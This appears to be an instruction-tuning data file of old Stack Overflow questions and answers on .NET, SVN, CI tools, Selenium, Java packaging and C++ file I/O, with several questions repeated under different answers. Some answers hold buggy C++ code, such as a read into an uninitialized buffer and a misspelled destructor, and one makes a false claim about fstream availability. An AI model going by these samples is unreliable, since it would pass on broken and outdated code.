{"instruction": "I've been using a lot of new .NET 3.5 features in the work that I've been doing, lately. The application that I'm building is intended for distribution among consumers who will probably not have the latest version (or perhaps any version) of the .NET framework on their machines.\nI went to go download the .NET 3.5 redistributable package only to find out that it's almost 200 MB! This is unacceptable for my application, because it's supposed to be a quick and painless consumer application that installs quickly and keeps a low profile on the user's machine. For users that have .NET 3.5 already installed, our binary downloads have been instantaneous, so far. This 200 MB gorilla will more than quadruple the size of the download. Is there any other option than this redistributable package that I can use to make sure the framework is on the machine that won't take the user out of our \"quick and painless\" workflow? Our target time from beginning of download to finalizing the install is less than two minutes. Is it just not possible for someone who doesn't already have .NET installed?", "output": "Once .NET Framework 3.5 SP1 comes out (should be fairly soon) there will be a second option of frameworks, namely the \"Client Profile\", which is a cut-down framework that only weighs in about about 30Mb from memory. It doesn't include all of the namespaces and classes of the full framework, but should be enough for most common apps in theory. It can be upgraded to the full framework if necessary (eg. if an update to your software introduces a new dependency)\nMore more information, see here: BCL Team blog"}
{"instruction": "I'm using subclipse in Flex Builder 3, and recently received this error when trying to commit:\nsvn: Checksum mismatch for '/Users/redacted/Documents/Flex Builder 3/path/to/my/file.mxml'; expected: 'f8cb275de72776657406154dd3c10348', actual: 'null'\nI worked around it by:\n\nCommitting all the other changed files, omitting the troublesome one.\nCopying the contents of the trouble file to a TextMate window\nDeleting my project in FlexBuilder/Eclipse\nChecking my project out fresh from SVN\nCopying the text of the trouble file back in from the TextMate Window\nCommitting the changes.\n\nIt worked, but I can't help but think there's a better way. What's actaully happening to cause the svn:checksum error, and what's the best fix.\nMaybe more important -- is this a symptom of a greater problem?", "output": "I occasionally get similar things, usually with files that nobody has been near in weeks. Generally, if you know you haven't been working in the directory in question, you can just delete the directory with the problem and run \nsvn update\nto recreate it.\nIf you have live changes in the directory then as lassevk and you yourself suggested, a more careful approach is required.\nGenerally speaking I would say it's a good idea not to leave edited files uncommitted, and keep the working copy tidy - don't add a whole bunch of extra files into the working copy that you aren't going to use. Commit regularly, and then if the working copy goes tits up, you can just delete the whole thing and start over without worrying about what you might or might not be losing, and without the pain of trying to figure out what files to save."}
{"instruction": "I have a ASP.NET application that we've written our own logging module for.\nMy question is, where is the standard place to write a log file to? I.e. the website will be running as the anonymous user identity (e.g. IUSR on IIS7) and I need a place where I know it'll have permission to write to.\nCheers,", "output": "App_Data folder on the root of the project. It isn't served to web requests; so other people can't snoop for it."}
{"instruction": "I'm suddenly back to WinForms, after years of web development, and am having trouble  with something that should be simple.  I have an ArrayList of business objects bound to a  Windows Forms DataGrid.  I'd like the user to be able to edit the cells, and when finished,  press a Save button.  At that point I'd like to iterate the all the rows and columns in the  DataGrid to find any changes, and save them to the database.  But I can't find a way to  access the DataGrid rows.  \nI'll also want to validate individual cells real time, as they are edited, but I'm pretty  sure that can be done.  (Maybe not with an ArrayList as the DataSource?)  But as for iterating the DataGrid, I'm quite surprised it doesn't seem possible.\nMust I really stuff my business objects data into datatables in order to use the datagrid?", "output": "Is there anything about WinForms 3.0 that is so much better than in 1.1\n\nI don't know about 3.0, but you can write code in VS 2008 which runs on the .NET 2.0 framework. (So, you get to use the latest C# language, but you can only use the 2.0 libraries)\nThis gets you Generics (List<DataRow> instead of those GodAwful ArrayLists) and a ton of other stuff, you'll literally end up writing 3x less code."}
{"instruction": "So I want to get a project on a distributed version control system, such as mercurial, git, or bazaar.  The catch is that I need the Windows support to be good, i.e. no instructions that start off with \"install cygwin...\".  Now I've heard that git's Windows support is decent these days, but don't have any first hand experience.  Also, it sounds like the bazaar team has an explicit goal of making it as multiplatform as possible.\r\nCan I get any recommendations?", "output": "There's a nice comparison between git, hg and bzr in this InfoQ article.  They all have their strengths and weaknesses.  You'll have to think about your project and your workflows and choose the best fit.  The good news is that they're all fairly good."}
{"instruction": "I have a ASP.NET application that we've written our own logging module for.\nMy question is, where is the standard place to write a log file to? I.e. the website will be running as the anonymous user identity (e.g. IUSR on IIS7) and I need a place where I know it'll have permission to write to.\nCheers,", "output": "I would suggest putting the log file onto a seperate disk, though should give you a little performance gain so that your not trying to both read and write to the same disk as the website. If you cannot put the log file on a seperate disk, then I would simply choose a folder of your choice.\nIn any case, you will have to give the \"Network Service\" account \"Modify\" permissions to the desired folder.\nIf on the other hand, you have access to a databse, then log the information there. It will be much quicker than accessing the hard drive and won't be publically available. You'll also be able to report from the data quite easily."}
{"instruction": "I've been using a lot of new .NET 3.5 features in the work that I've been doing, lately. The application that I'm building is intended for distribution among consumers who will probably not have the latest version (or perhaps any version) of the .NET framework on their machines.\nI went to go download the .NET 3.5 redistributable package only to find out that it's almost 200 MB! This is unacceptable for my application, because it's supposed to be a quick and painless consumer application that installs quickly and keeps a low profile on the user's machine. For users that have .NET 3.5 already installed, our binary downloads have been instantaneous, so far. This 200 MB gorilla will more than quadruple the size of the download. Is there any other option than this redistributable package that I can use to make sure the framework is on the machine that won't take the user out of our \"quick and painless\" workflow? Our target time from beginning of download to finalizing the install is less than two minutes. Is it just not possible for someone who doesn't already have .NET installed?", "output": "For the record, .Net Framework 3.5 SP1 is required for Microsoft SQL Server 2008 to install and RTM'd around the same time as the release this week. Still a hefty install but you can extract the client profile from it. Just not to sure how."}
{"instruction": "I have some code for starting a thread on the .NET CF 2.0:\nThreadStart tStart = new ThreadStart(MyMethod);\nThread t = new Thread(tStart);\nt.Start();\n\nIf I call this inside a loop the items complete out of order. How do introduce a wait after t.Start(), so that the work on the thread completes before the code continues? Will BeginInvoke/EndInvoke be a better option for this than manually creating threads?", "output": "If I'm reading this properly, you're starting work items on bunch of threads but you're concerned that the threads are completing out of order, and, would prefer to wait until each thread completes in the order they were started ? \nIf this is the case then I'm not sure why you're creating a thread per work item. Maybe you could expand?\nIf you did need to wait for a thread to complete the you could just do:\nt.Join();"}
{"instruction": "I have some code for starting a thread on the .NET CF 2.0:\nThreadStart tStart = new ThreadStart(MyMethod);\nThread t = new Thread(tStart);\nt.Start();\n\nIf I call this inside a loop the items complete out of order. How do introduce a wait after t.Start(), so that the work on the thread completes before the code continues? Will BeginInvoke/EndInvoke be a better option for this than manually creating threads?", "output": "How much order do you need to impose on the threads? If you just need all of the work started in the loop to finish before the code continues, but you don't care about the order the work within the loop finishes, then calling Join is the answer. To add more detail to Kevin Kenny's answer, you should call Join outside the loop. This means you will need a collection to hold references to the threads you started:\n// Start all of the threads.\nList<Thread> startedThreads = new List<Thread>();\nforeach (...) {\n  Thread thread = new Thread(new ThreadStart(MyMethod));\n  thread.Start();\n  startedThreads.Add(thread);\n}\n\n// Wait for all of the threads to finish.\nforeach (Thread thread in startedThreads) {\n  thread.Join();\n}\n\nIn contrast, if you called Join inside the loop, the result would basically be the same as not using threads at all. Each iteration of the loop body would create and start a thread but then immediately Join it and wait for it to finish.\nIf the individual threads produce some result (write a message in a log, for example) then the messages may still appear out of order because there's no coordination between the threads. It is possible to get the threads to output their results in order by coordinating them with a Monitor."}
{"instruction": "What is a good way to perform animation using .NET?\nI would prefer not to use Flash if possible, so am looking for suggestions of ways which will work to implement different types of animation on a new site I am producing.\nThe new site is for a magician, so I want to provide animated buttons (Cards turning over, etc.) and also embed video.  Is it possible to do this without using Flash or is this the only real solution?  I would like to keep it as cross-platform and standard as possible.", "output": "JavaScript is probably the way to go if you want to avoid Flash. Check this: http://www.webreference.com/programming/javascript/java_anim/\nIt won't work for embedded video, though, so you're stuck with Flash for that (or Silverlight, or QuickTime)."}
{"instruction": "What is a good way to perform animation using .NET?\nI would prefer not to use Flash if possible, so am looking for suggestions of ways which will work to implement different types of animation on a new site I am producing.\nThe new site is for a magician, so I want to provide animated buttons (Cards turning over, etc.) and also embed video.  Is it possible to do this without using Flash or is this the only real solution?  I would like to keep it as cross-platform and standard as possible.", "output": "Silverlight springs to mind as an obvious choice if you want to do animation using .NET on the web. It may not cover all platforms but will work in IE and FireFox and on the Mac."}
{"instruction": "What tools would you recommend for setting up CI for build and deployment of multiple websites built on DotNetNuke using SVN for source control? \nWe are currently looking at configuring Cruise Control to work with NAnt, NUnit, NCover and Trac as a test case. What other combinations would worth investigating?\nWe have full control of our development environment so using some form of CI is certain here but I would also like to convince our production services team that they can reliably deploy to the system test, uat and even production environments using these tools.", "output": "I would have a look at Team City http://www.jetbrains.com/teamcity/index.html\nI know some people who are looking in to this and they say good things about it.\nMy companies build process is done in FinalBuilder so I'm going to be looking at their server soon.\nCC is quite good in that you can have one CC server monitor another CC server so you could set up stuff like - when a build completes on your build server, your test server would wake up, boot up a virtual machine and deploy your application.  Stuff like that."}
{"instruction": "What is a good way to perform animation using .NET?\nI would prefer not to use Flash if possible, so am looking for suggestions of ways which will work to implement different types of animation on a new site I am producing.\nThe new site is for a magician, so I want to provide animated buttons (Cards turning over, etc.) and also embed video.  Is it possible to do this without using Flash or is this the only real solution?  I would like to keep it as cross-platform and standard as possible.", "output": "Have a look at the jQuery cross browser JavaScript library for animation (it is what is used on Stack Overflow). The reference for it can be found at http://visualjquery.com/1.1.2.html.\nUnfortunately without Flash, Silverlight or another plug-in cross system video support is limited."}
{"instruction": "I have a little game written in C#. It uses a database as back-end. It's \na trading card game, and I wanted to implement the function of the cards as a script.\nWhat I mean is that I essentially have an interface, ICard, which a card class implements (public class Card056 : ICard) and which contains function that are called by the game.\nNow, to make the thing maintainable/moddable, I would like to have the class for each card as source code in the database and essentially compile it on first use. So when I have to add/change a card, I'll just add it to the database and tell my application to refresh, without needing any assembly deployment (especially since we would be talking about 1 assembly per card which means hundreds of assemblies).\nIs that possible? Register a class from a source file and then instantiate it, etc.\nICard Cards[current] = new MyGame.CardLibrary.Card056();\nCards[current].OnEnterPlay(ref currentGameState);\n\nThe language is C#, but extra bonus if it's possible to write the script in any .NET language.", "output": "The main application that my division sells does something very similar to provide client customisations (which means that I can't post any source). We have a C# application that loads dynamic VB.NET scripts (although any .NET language could be easily supported - VB was chosen because the customisation team came from an ASP background).\nUsing .NET's CodeDom we compile the scripts from the database, using the VB CodeDomProvider (annoyingly it defaults to .NET 2, if you want to support 3.5 features you need to pass a dictionary with \"CompilerVersion\" = \"v3.5\" to its constructor). Use the CodeDomProvider.CompileAssemblyFromSource method to compile it (you can pass settings to force it to compile in memory only.\nThis would result in hundreds of assemblies in memory, but you could put all the dynamic classes' code together into a single assembly, and recompile the whole lot when any change. This has the advantage that you could add a flag to compile on disk with a PDB for when you're testing, allowing you to debug through the dynamic code."}
{"instruction": "What tools would you recommend for setting up CI for build and deployment of multiple websites built on DotNetNuke using SVN for source control? \nWe are currently looking at configuring Cruise Control to work with NAnt, NUnit, NCover and Trac as a test case. What other combinations would worth investigating?\nWe have full control of our development environment so using some form of CI is certain here but I would also like to convince our production services team that they can reliably deploy to the system test, uat and even production environments using these tools.", "output": "We use CruiseControl with NUnit, NCover, FxCop, SVN and some custom tools we wrote ourselves to produce the reports. In my opinion it has proven (over the last few years) to be an excellent combination.\nIt's frustrating that MS restricts all of its integration tools to VSTS.  Its test framework is as good as NUnit, but you can't use its code coverage tools or anything else.\nI'd check out XNuit - it's looking pretty promising (but currently lacking UI).\nWe automate nightly builds, and you could automate UAT and manual test builds, but I'm not sure that we'd ever want to automate the release to our production servers. Even if it were any change would be important enough that someone would have to watch over it anyway."}
{"instruction": "What tools would you recommend for setting up CI for build and deployment of multiple websites built on DotNetNuke using SVN for source control? \nWe are currently looking at configuring Cruise Control to work with NAnt, NUnit, NCover and Trac as a test case. What other combinations would worth investigating?\nWe have full control of our development environment so using some form of CI is certain here but I would also like to convince our production services team that they can reliably deploy to the system test, uat and even production environments using these tools.", "output": "Microsoft loosened it's constraint on the Testing Platform by including it in Visual Studio 2008 Professional and allowing for the tests to be run from the command line with Framework 3.5 installed. We did a crossover for a client recently and so far they have been able to run all the tests without the need for NUnit."}
{"instruction": "What is a good way to perform animation using .NET?\nI would prefer not to use Flash if possible, so am looking for suggestions of ways which will work to implement different types of animation on a new site I am producing.\nThe new site is for a magician, so I want to provide animated buttons (Cards turning over, etc.) and also embed video.  Is it possible to do this without using Flash or is this the only real solution?  I would like to keep it as cross-platform and standard as possible.", "output": "Silverlight is the answer and Moonlight will be the linux equivalent and available shortly. We have done some beta testing on moonlight and found it fairly stable at with most of the Silverlight work we do."}
{"instruction": "I have a ASP.NET application that we've written our own logging module for.\nMy question is, where is the standard place to write a log file to? I.e. the website will be running as the anonymous user identity (e.g. IUSR on IIS7) and I need a place where I know it'll have permission to write to.\nCheers,", "output": "I'm not in a position to modify the permissions on folders (especially outside of the virtual directory home folder), and don't already have an App_Data folder, so am a bit hesitant to go with that. \nSo for the moment I'm going with the CommonApplicationData Folder. \n\nOn Vista/Server 2008 this is C:\\ProgramData\\\nOn XP/Server 2003 this is C:\\Documents and Settings\\All Users\\Application Data\\"}
{"instruction": "I have a ASP.NET application that we've written our own logging module for.\nMy question is, where is the standard place to write a log file to? I.e. the website will be running as the anonymous user identity (e.g. IUSR on IIS7) and I need a place where I know it'll have permission to write to.\nCheers,", "output": "I'm not in a position to modify the permissions on folders (especially outside of the virtual directory home folder), and don't already have an App_Data folder, so am a bit hesitant to go with that.\n\nIf you have a website, you clearly have a folder somewhere.  Can you not add a (non-web-facing) subfolder?  It seems like that would be a more appropriate place to put your logs than dumping them into a global, shared folder."}
{"instruction": "The company I'm currently working for is using Selenium for Uniting-Testing our User Interface. What do you use to Unit-Test your Web UI and how effective do you find it?", "output": "We use Selenium Core, but are switching gradually to Selenium RC which is much nicer and easier to manage. We have written lots of custom code to make the tests run on our Continuous Integration servers, some of them in parallel suites to run faster. \nOne thing you'll find is that Selenium seems to restart the browser for each test (you can set it not to do this, but we got memory problems when we did that). This can be slow in Firefox, but is not too bad in IE (one time I'm thankful for Bill Gates's OS integraion)."}
{"instruction": "The company I'm currently working for is using Selenium for Uniting-Testing our User Interface. What do you use to Unit-Test your Web UI and how effective do you find it?", "output": "We are using QuickTestPro.  So far it is effective, but the browser selection is limited.  The nicest part is the ability to record your browser's activity, and convert it into a scriptable set of steps.  There is also a nice .Net addin so if you have any validation code you need to do for the different stages of your test, you can write methods in an assembly and call them from your script."}
{"instruction": "After a couple hours fighting with the Gallery2 RSS module and getting only the message, \"no feeds have yet been defined\", I gave up.  Based on a Google search for \"no feeds have yet been defined\", this is a pretty common problem.  Do you have any tips and/or tricks for getting the Gallery2 RSS module to work?  Or any tips for a relatively-PHP-ignorant developer trying to debug problems with this PHP application?", "output": "My eventual (and hopefully temporary) solution to this problem was a Python CGI script.  My script follows for anyone who might find it useful (despite the fact that this is a total hack).  \n#!/usr/bin/python\n\"\"\"A CGI script to produce an RSS feed of top-level Gallery2 albums.\"\"\"\n\n#import cgi\n#import cgitb; cgitb.enable()\nfrom time import gmtime, strftime\nimport MySQLdb\n\nALBUM_QUERY = '''\n    select g_id, g_title, g_originationTimestamp\n    from g_Item\n    where g_canContainChildren = 1 \n    order by g_originationTimestamp desc\n    limit 0, 20\n    '''\n\nRSS_TEMPLATE = '''Content-Type: text/xml\n\n<?xml version=\"1.0\"?>\n<rss version=\"2.0\">\n  <channel>\n    <title>TITLE</title>\n    <link><http://example.com/gallery2/main.php></link>\n    <description>DESCRIPTION</description>\n    <ttl>1440</ttl>\n%s\n  </channel>\n</rss>\n'''\n\nITEM_TEMPLATE = '''\n    <item>\n      <title>%s</title>\n      <link><http://example.com/gallery2/main.php?g2_itemId=%s></link>\n      <description>%s</description>\n      <pubDate>%s</pubDate>\n    </item>\n'''\n\ndef to_item(row):\n    item_id = row[0]\n    title = row[1]\n    date = strftime(\"%a, %d %b %Y %H:%M:%S GMT\", gmtime(row[2]))\n    return ITEM_TEMPLATE % (title, item_id, title, date)\n\nconn = MySQLdb.connect(host = \"HOST\",\n                       user = \"USER\",\n                       passwd = \"PASSWORD\",\n                       db = \"DATABASE\")\ncurs = conn.cursor()\ncurs.execute(ALBUM_QUERY)\nprint RSS_TEMPLATE % ''.join([ to_item(row) for row in curs.fetchall() ])\ncurs.close()"}
{"instruction": "I have a ASP.NET application that we've written our own logging module for.\nMy question is, where is the standard place to write a log file to? I.e. the website will be running as the anonymous user identity (e.g. IUSR on IIS7) and I need a place where I know it'll have permission to write to.\nCheers,", "output": "You could also log to the Windows Event log or to a table in a database.  How often are people looking at the event log?  If it's being examined on a regualr basis, writing to a table amkes the reporting back much easier as it's trivial to reverse the order and only show the last X events for the current time period.  The Windows Event log you can also query the Windows Event Log through PowerShell or with LogParser."}
{"instruction": "How do I setup Public-Key Authentication for SSH?", "output": "For windows this is a good introduction and guide\nHere are some good ssh-agents for systems other than linux.\n\nWindows - pageant\nOS X - SSHKeychain"}
{"instruction": "The company I'm currently working for is using Selenium for Uniting-Testing our User Interface. What do you use to Unit-Test your Web UI and how effective do you find it?", "output": "Well, if you've designed your application properly, you won't have scads of logic inside the UI anyway. It makes much more sense to separate the actual work getting done into units separate from the UI, and then test those. \nIf you do that, then the only code in the UI will be code that invokes the backend, so simply testing the backend is sufficient.\nI have used NUnit ASP in the past (at my job), and if you insist on unit testing your UI, I would strongly advise you to use ANYTHING but NUnit ASP. It's a pain to work with, and tests tend to be invalidated (needing to be revised) after even the most minor UI changes (even if the subjects of the tests don't actually change)."}
{"instruction": "I'm suddenly back to WinForms, after years of web development, and am having trouble  with something that should be simple.  I have an ArrayList of business objects bound to a  Windows Forms DataGrid.  I'd like the user to be able to edit the cells, and when finished,  press a Save button.  At that point I'd like to iterate the all the rows and columns in the  DataGrid to find any changes, and save them to the database.  But I can't find a way to  access the DataGrid rows.  \nI'll also want to validate individual cells real time, as they are edited, but I'm pretty  sure that can be done.  (Maybe not with an ArrayList as the DataSource?)  But as for iterating the DataGrid, I'm quite surprised it doesn't seem possible.\nMust I really stuff my business objects data into datatables in order to use the datagrid?", "output": "object cell = myDataGrid[row, col];"}
{"instruction": "The company I'm currently working for is using Selenium for Uniting-Testing our User Interface. What do you use to Unit-Test your Web UI and how effective do you find it?", "output": "We have been using JSunit for a while to do unit tests... it may not be the same kinds of tests you are talking about, but it is great for ensuring your JavaScript works as you expect.\nYou run it in the browser, and it can be set in an Ant build to be automatically run against a bunch of browsers on a bunch of platforms remotely (so you can ensure your code is cross-browser as well as ensure the logic is correct).\nI don't think it replaces Selenium, but it complements it well."}
{"instruction": "Recently I have been having issues with Firefox 3 on Ubuntu Hardy Heron.\nI will click on a link and it will hang for a while.  I don't know if its a bug in Firefox 3 or a page running too much client side JavaScript, but I would like to try and debug it a bit.\nSo, my question is \"is there a way to have some kind of process explorer, or task manager sort of thing for Firefox 3?\"\nI would like to be able to see what tabs are using what percent of my processor via the JavaScript on that page (or anything in the page that is causing CPU/memory usage).  \nDoes anybody know of a plugin that does this, or something similar?  Has anyone else done this kind of inspection another way?\nI know about FireBug, but I can't imagine how I would use it to finger which tab is using a lot of resources.\nAny suggestions or insights?", "output": "It's probably the awesome firefox3 fsync \"bug\", which is a giant pile of fail.\nIn summary\n\nFirefox3 saves its bookmarks and history in an SQLite database\nEvery time you load a page it writes to this database several times\nSQLite cares deeply that you don't lose your bookmarks, so each time it writes, instructs the kernel to flush it's database file to disk and ensure that it's fully written\nMany variants of linux, when told to flush like that, flush EVERY FILE. This may take up to a minute or more if you have background tasks doing any kind of disk intensive stuff.\nThe kernel makes firefox wait while this flush happens, which locks up the UI."}
{"instruction": "In a .net system I'm building, there is a need for automated e-mail notifications. These should be editable by an admin. What's the easiest way to do this? SQL table and WYSIWIG for editing?\n\nThe queue is a great idea. I've been throwing around that type of process for awhile with my old company.", "output": "Adam Haile writes:\n\ncheck out the System.Web.Mail namespace\n\n\nBy which you mean System.Net.Mail in .Net 2.0 and above :)"}
{"instruction": "In a .net system I'm building, there is a need for automated e-mail notifications. These should be editable by an admin. What's the easiest way to do this? SQL table and WYSIWIG for editing?\n\nThe queue is a great idea. I've been throwing around that type of process for awhile with my old company.", "output": "How about using the new Workflow components in .Net 3.0 (and 3.5)? That is what we use in combination with templates in my current project. The templates have the basic format and the the tokens that are replaced with user information."}
{"instruction": "I want to be able to do:For Each thing In things\r\nEnd For\r\n\nCLASSIC ASP - NOT .NET!", "output": "Something like this?\ndim cars(2),x\ncars(0)=\"Volvo\"\ncars(1)=\"Saab\"\ncars(2)=\"BMW\"\n\nFor Each x in cars\n  response.write(x & \"<br />\")\nNext\n\nSee www.w3schools.com.\nIf you want to associate keys and values use a dictionary object instead:\nDim objDictionary\nSet objDictionary = CreateObject(\"Scripting.Dictionary\")\nobjDictionary.Add \"Name\", \"Scott\"\nobjDictionary.Add \"Age\", \"20\"\nif objDictionary.Exists(\"Name\") then\n    ' Do something\nelse\n    ' Do something else \nend if"}
{"instruction": "I am writing an application in Java for the desktop using the Eclipse SWT library for GUI rendering.  I think SWT helps Java get over the biggest hurdle for acceptance on the desktop: namely providing a Java application with a consistent, responsive interface that looks like that belonging to any other app on your desktop.  However, I feel that packaging an application is still an issue.  \nOS X natively provides an easy mechanism for wrapping Java apps in native application bundles, but producing an app for Windows/Linux that doesn't require the user to run an ugly batch file or click on a .jar is still a hassle.  Possibly that's not such an issue on Linux, where the user is likely to be a little more tech-savvy, but on Windows I'd like to have a regular .exe for him/her to run.\nHas anyone had any experience with any of the .exe generation tools for Java that are out there?  I've tried JSmooth but had various issues with it.  Is there a better solution before I crack out Visual Studio and roll my own?\nEdit:  I should perhaps mention that I am unable to spend a lot of money on a commercial solution.", "output": "Install4J. Not free, but worth it. Give the trial a shot"}
{"instruction": "I am writing an application in Java for the desktop using the Eclipse SWT library for GUI rendering.  I think SWT helps Java get over the biggest hurdle for acceptance on the desktop: namely providing a Java application with a consistent, responsive interface that looks like that belonging to any other app on your desktop.  However, I feel that packaging an application is still an issue.  \nOS X natively provides an easy mechanism for wrapping Java apps in native application bundles, but producing an app for Windows/Linux that doesn't require the user to run an ugly batch file or click on a .jar is still a hassle.  Possibly that's not such an issue on Linux, where the user is likely to be a little more tech-savvy, but on Windows I'd like to have a regular .exe for him/her to run.\nHas anyone had any experience with any of the .exe generation tools for Java that are out there?  I've tried JSmooth but had various issues with it.  Is there a better solution before I crack out Visual Studio and roll my own?\nEdit:  I should perhaps mention that I am unable to spend a lot of money on a commercial solution.", "output": "I went through the same and found that all of the free options weren't very good. Looks like you'll be writing your own. I'd be interested to see if someone has a free/cheap option that works"}
{"instruction": "I am writing an application in Java for the desktop using the Eclipse SWT library for GUI rendering.  I think SWT helps Java get over the biggest hurdle for acceptance on the desktop: namely providing a Java application with a consistent, responsive interface that looks like that belonging to any other app on your desktop.  However, I feel that packaging an application is still an issue.  \nOS X natively provides an easy mechanism for wrapping Java apps in native application bundles, but producing an app for Windows/Linux that doesn't require the user to run an ugly batch file or click on a .jar is still a hassle.  Possibly that's not such an issue on Linux, where the user is likely to be a little more tech-savvy, but on Windows I'd like to have a regular .exe for him/her to run.\nHas anyone had any experience with any of the .exe generation tools for Java that are out there?  I've tried JSmooth but had various issues with it.  Is there a better solution before I crack out Visual Studio and roll my own?\nEdit:  I should perhaps mention that I am unable to spend a lot of money on a commercial solution.", "output": "Have you thought about Java Web Start?  Here is a tutorial specifically for deploying an SWT application with Java Web Start."}
{"instruction": "Recently I have been having issues with Firefox 3 on Ubuntu Hardy Heron.\nI will click on a link and it will hang for a while.  I don't know if its a bug in Firefox 3 or a page running too much client side JavaScript, but I would like to try and debug it a bit.\nSo, my question is \"is there a way to have some kind of process explorer, or task manager sort of thing for Firefox 3?\"\nI would like to be able to see what tabs are using what percent of my processor via the JavaScript on that page (or anything in the page that is causing CPU/memory usage).  \nDoes anybody know of a plugin that does this, or something similar?  Has anyone else done this kind of inspection another way?\nI know about FireBug, but I can't imagine how I would use it to finger which tab is using a lot of resources.\nAny suggestions or insights?", "output": "There's no \"process explorer\" kind of tool for Firefox; but there's http://developer.mozilla.org/en/docs/Venkman with profiling mode, which you could use to see the time spent by chrome (meaning non-content, that is not web-page) scripts.\nFrom what I've read about it, DTrace might also be useful for this sort of thing, but it requires creating a custom build and possibly adding additional probes to the source. I haven't played with it myself yet."}
{"instruction": "I want to open a file for reading, the C++ way. I need to be able to do it for:\n\ntext files, which would involve some sort of read line function.\nbinary files, which would provide a way to read raw data into a char* buffer.", "output": "There are three ways to do this, depending on your needs. You could use the old-school C way and call fopen/fread/fclose, or you could use the C++ fstream facilities (ifstream/ofstream), or if you're using MFC, use the CFile class, which provides functions to accomplish actual file operations.\nAll of these are suitable for both text and binary, though none have a specific readline functionality. What you'd most likely do instead in that case is use the fstream classes (fstream.h) and use the stream operators (<< and >>) or the read function to read/write blocks of text:\nint nsize = 10;\nchar *somedata;\nifstream myfile;\nmyfile.open(\"<path to file>\");\nmyfile.read(somedata,nsize);\nmyfile.close();\n\nNote that, if you're using Visual Studio 2005 or higher, traditional fstream may not be available (there's a new Microsoft implementation, which is slightly different, but accomplishes the same thing)."}
{"instruction": "I want to open a file for reading, the C++ way. I need to be able to do it for:\n\ntext files, which would involve some sort of read line function.\nbinary files, which would provide a way to read raw data into a char* buffer.", "output": "You need to use an ifstream if you just want to read (use an ofstream to write, or an fstream for both).\nTo open a file in text mode, do the following:\nifstream in(\"filename.ext\", ios_base::in); // the in flag is optional\n\nTo open a file in binary mode, you just need to add the \"binary\" flag.\nifstream in2(\"filename2.ext\", ios_base::in | ios_base::binary ); \n\nUse the ifstream.read() function to read a block of characters (in binary or text mode).  Use the getline() function (it's global) to read an entire line."}
{"instruction": "I want to open a file for reading, the C++ way. I need to be able to do it for:\n\ntext files, which would involve some sort of read line function.\nbinary files, which would provide a way to read raw data into a char* buffer.", "output": "fstream are great but I will go a little deeper and tell you about RAII.\nThe problem with a classic example is that you are forced to close the file by yourself, meaning that you will have to bend your architecture to this need. RAII makes use of the automatic destructor call in C++ to close the file for you.\nUpdate: seems that std::fstream already implements RAII so the code below is useless. I'll keep it here for posterity and as an example of RAII. \nclass FileOpener\n{\npublic:\n    FileOpener(std::fstream& file, const char* fileName): m_file(file)\n    { \n        m_file.open(fileName); \n    }\n    ~FileOpeneer()\n    { \n        file.close(); \n    }\n\nprivate:\n    std::fstream& m_file;\n};\n\nYou can now use this class in your code like this:\nint nsize = 10;\nchar *somedata;\nifstream myfile;\nFileOpener opener(myfile, \"<path to file>\");\nmyfile.read(somedata,nsize);\n// myfile is closed automatically when opener destructor is called\n\nLearning how RAII works can save you some headaches and some major memory management bugs."}
{"instruction": "Even though I always strive for complete validation these days, I often wonder if it's a waste of time.  If the code runs and it looks the same in all browsers (I use browsershots.org to verify) then do I need to take it any further or am I just being overly anal?\nWhat level do you hold your code to when you create it for:\na) yourself\nb) your clients\nP.S. Jeff and company, why doesn't stack overflow validate? :)\nEDIT: Some good insights, I think that since I've been so valid-obsessed for so long I program knowing what will cause problems and what won't so I'm in a better position than people who create a site first and then \"go back and fix the validation problems\"\nI think I may post another question on stack overflow; \"Do you validate as you go or do you finish and then go back and validate?\" as that seems to be where this question is going", "output": "a) Must look the same\nb) As standards-compliant as possible, but not so anal that it blocks finishing work\nIn a situation where you have perpetual access to the code, I don't think standards-compliance is all that important, since you can always make changes to the code if something breaks. If you don't have perpetual access (ie, you sign off on the code and it becomes someone else's responsibility), it's probably best to be as standards-compliant as possible to minimize maintenance headaches later... even if you never have to deal with the code again, your reputation persists and can be transmitted to other potential clients, and many teams like to blame the previous developer(s) for problems that come up."}
{"instruction": "Even though I always strive for complete validation these days, I often wonder if it's a waste of time.  If the code runs and it looks the same in all browsers (I use browsershots.org to verify) then do I need to take it any further or am I just being overly anal?\nWhat level do you hold your code to when you create it for:\na) yourself\nb) your clients\nP.S. Jeff and company, why doesn't stack overflow validate? :)\nEDIT: Some good insights, I think that since I've been so valid-obsessed for so long I program knowing what will cause problems and what won't so I'm in a better position than people who create a site first and then \"go back and fix the validation problems\"\nI think I may post another question on stack overflow; \"Do you validate as you go or do you finish and then go back and validate?\" as that seems to be where this question is going", "output": "I think validation is a good litmus test of whether you've done things properly, so if there are only a few minor problems, why not fix them and ensure your site will at least be understood correctly by browsers in the future (even if they do render things differently for other reasons)?\nOTOH, for most projects, validation seems like a huge headache and if you can get things working across browsers, it's not worth spending an extra day/week+ on just validation."}
{"instruction": "Even though I always strive for complete validation these days, I often wonder if it's a waste of time.  If the code runs and it looks the same in all browsers (I use browsershots.org to verify) then do I need to take it any further or am I just being overly anal?\nWhat level do you hold your code to when you create it for:\na) yourself\nb) your clients\nP.S. Jeff and company, why doesn't stack overflow validate? :)\nEDIT: Some good insights, I think that since I've been so valid-obsessed for so long I program knowing what will cause problems and what won't so I'm in a better position than people who create a site first and then \"go back and fix the validation problems\"\nI think I may post another question on stack overflow; \"Do you validate as you go or do you finish and then go back and validate?\" as that seems to be where this question is going", "output": "I think this is an area in which you should strive to use the Robustness principle as far as is practical (which is good advice for any area of coding). Just because something works today doesn't mean it will work tomorrow: if you're relying on a particular HTML/CSS hack or even if you've just been a little lax in emitting strictly valid code, the next iteration of browsers could well break. Doing it once the right way minimises this problem (though does not entirely mitigate it).\nThere is a certain element of pragmatism to take here, though. I'd certainly do all I could for a client's site to be valid, but I would be willing to take more risks in my own space."}
